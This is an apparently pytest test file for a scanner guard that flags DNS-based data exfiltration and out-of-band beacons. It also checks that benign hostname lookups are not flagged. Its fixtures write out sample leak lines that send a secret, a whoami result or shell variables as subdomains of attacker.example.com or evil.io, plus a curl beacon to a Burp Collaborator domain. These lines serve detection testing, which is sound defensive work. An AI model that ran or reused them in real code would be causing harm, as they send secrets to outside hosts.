"""Tests for the dns-exfiltration-pattern guard.

Covers:
  - dns-exfiltration-pattern/dynamic-hostname-dns (HIGH)
  - dns-exfiltration-pattern/oob-beacon (HIGH)
"""
from __future__ import annotations

import pytest

from agentsec.guards.dns_exfiltration_pattern import DnsExfiltrationPatternGuard
from tests.guards._common import *  # noqa: F401,F403


def test_fires_on_dynamic_getaddrinfo_fstring(tmp_path: Path) -> None:
    (tmp_path / "t.py").write_text(
        "import socket\n"
        "def leak(secret):\n"
        "    socket.getaddrinfo(f'{secret}.attacker.example.com', 80)\n",
        encoding="utf-8",
    )
    findings = DnsExfiltrationPatternGuard().run(tmp_path, _pyprof(tmp_path))
    assert any(f.rule == "dns-exfiltration-pattern/dynamic-hostname-dns" for f in findings)


def test_fires_on_dynamic_gethostbyname_format(tmp_path: Path) -> None:
    (tmp_path / "t.py").write_text(
        "import socket\n"
        "def leak(secret):\n"
        "    socket.gethostbyname('{}.attacker.example.com'.format(secret))\n",
        encoding="utf-8",
    )
    findings = DnsExfiltrationPatternGuard().run(tmp_path, _pyprof(tmp_path))
    assert any(f.rule == "dns-exfiltration-pattern/dynamic-hostname-dns" for f in findings)


def test_fires_on_shell_dynamic_nslookup(tmp_path: Path) -> None:
    (tmp_path / "leak.sh").write_text(
        "#!/bin/sh\nnslookup $SECRET.attacker.example.com\n", encoding="utf-8"
    )
    findings = DnsExfiltrationPatternGuard().run(tmp_path, _pyprof(tmp_path))
    assert any(f.rule == "dns-exfiltration-pattern/dynamic-hostname-dns" for f in findings)


def test_fires_on_curl_to_oob_domain(tmp_path: Path) -> None:
    (tmp_path / "probe.sh").write_text(
        "#!/bin/sh\ncurl https://abc123.burpcollaborator.net/hit\n", encoding="utf-8"
    )
    findings = DnsExfiltrationPatternGuard().run(tmp_path, _pyprof(tmp_path))
    assert any(f.rule == "dns-exfiltration-pattern/oob-beacon" for f in findings)


def test_passes_literal_hostname_resolution(tmp_path: Path) -> None:
    (tmp_path / "t.py").write_text(
        "import socket\n"
        "def resolve():\n"
        "    return socket.getaddrinfo('api.example.com', 443)\n",
        encoding="utf-8",
    )
    assert DnsExfiltrationPatternGuard().run(tmp_path, _pyprof(tmp_path)) == []


def test_passes_curl_to_ordinary_domain(tmp_path: Path) -> None:
    (tmp_path / "deploy.sh").write_text(
        "#!/bin/sh\ncurl https://api.example.com/health\n", encoding="utf-8"
    )
    assert DnsExfiltrationPatternGuard().run(tmp_path, _pyprof(tmp_path)) == []


def test_passes_static_nslookup(tmp_path: Path) -> None:
    (tmp_path / "check.sh").write_text(
        "#!/bin/sh\nnslookup api.example.com\n", encoding="utf-8"
    )
    assert DnsExfiltrationPatternGuard().run(tmp_path, _pyprof(tmp_path)) == []


def test_pragma_suppresses_whole_file(tmp_path: Path) -> None:
    (tmp_path / "t.py").write_text(
        "# security: allow-dns-exfiltration-pattern\n"
        "import socket\n"
        "def leak(secret):\n"
        "    socket.getaddrinfo(f'{secret}.attacker.example.com', 80)\n",
        encoding="utf-8",
    )
    assert DnsExfiltrationPatternGuard().run(tmp_path, _pyprof(tmp_path)) == []


def test_does_not_apply_with_no_relevant_stack(tmp_path: Path) -> None:
    prof = mkprofile(tmp_path, features=set())
    assert DnsExfiltrationPatternGuard().applies(prof) is False


@pytest.mark.parametrize("call", [
    "socket.gethostbyname(secret + '.attacker.example.com')",
    "socket.getaddrinfo(f\"{secret.hex()}.evil.com\", 53)",
])
def test_fires_on_data_label_in_front_of_literal_domain(tmp_path: Path, call: str) -> None:
    (tmp_path / "t.py").write_text(
        f"import socket\ndef leak(secret):\n    {call}\n", encoding="utf-8"
    )
    findings = DnsExfiltrationPatternGuard().run(tmp_path, _pyprof(tmp_path))
    assert [f.rule for f in findings] == ["dns-exfiltration-pattern/dynamic-hostname-dns"]
    assert findings[0].location.endswith("t.py:3")


@pytest.mark.parametrize("line", [
    'dig "$chunk.attacker.example.com"',
    "nslookup $(whoami).attacker.example.com",
    "dig +short ${DATA}.x.evil.io",
])
def test_fires_on_shell_variable_label_in_front_of_literal_domain(tmp_path: Path, line: str) -> None:
    (tmp_path / "leak.sh").write_text(f"#!/bin/sh\n{line}\n", encoding="utf-8")
    findings = DnsExfiltrationPatternGuard().run(tmp_path, _pyprof(tmp_path))
    assert [f.rule for f in findings] == ["dns-exfiltration-pattern/dynamic-hostname-dns"]
    assert findings[0].location.endswith("leak.sh:2")


@pytest.mark.parametrize("line", [
    # flagship scripts/list-ssh-hosts.sh:29: a reverse lookup of an IP held in a variable
    'hostname=$(dig +short +time=2 +tries=1 -x "$ip" 2>/dev/null)',
    # anthropics/claude-code init-firewall.sh: resolving an allow-listed domain
    'ips=$(dig +noall +answer A "$domain" | awk \'$4 == "A" {print $5}\')',
    "nslookup $HOST",
    'dig "$sub.$domain"',
    # a private / special-use suffix never reaches an attacker's authoritative server
    "nslookup $SVC.default.svc.cluster.local",
])
def test_passes_shell_dns_lookup_of_a_variable_host(tmp_path: Path, line: str) -> None:
    (tmp_path / "hosts.sh").write_text(f"#!/bin/sh\n{line}\n", encoding="utf-8")
    assert DnsExfiltrationPatternGuard().run(tmp_path, _pyprof(tmp_path)) == []


@pytest.mark.parametrize("call", [
    'socket.getaddrinfo(f"{host}", port)',
    "socket.gethostbyname('{}'.format(name))",
    'socket.getaddrinfo(f"{host}.{domain}", 443)',
    'socket.getaddrinfo(prefix + "." + domain, 443)',
    'socket.gethostbyname(f"{svc}.internal")',
])
def test_passes_python_resolver_with_dynamic_host(tmp_path: Path, call: str) -> None:
    (tmp_path / "t.py").write_text(
        f"import socket\ndef resolve(host, port, name, domain, prefix, svc):\n    return {call}\n",
        encoding="utf-8",
    )
    assert DnsExfiltrationPatternGuard().run(tmp_path, _pyprof(tmp_path)) == []
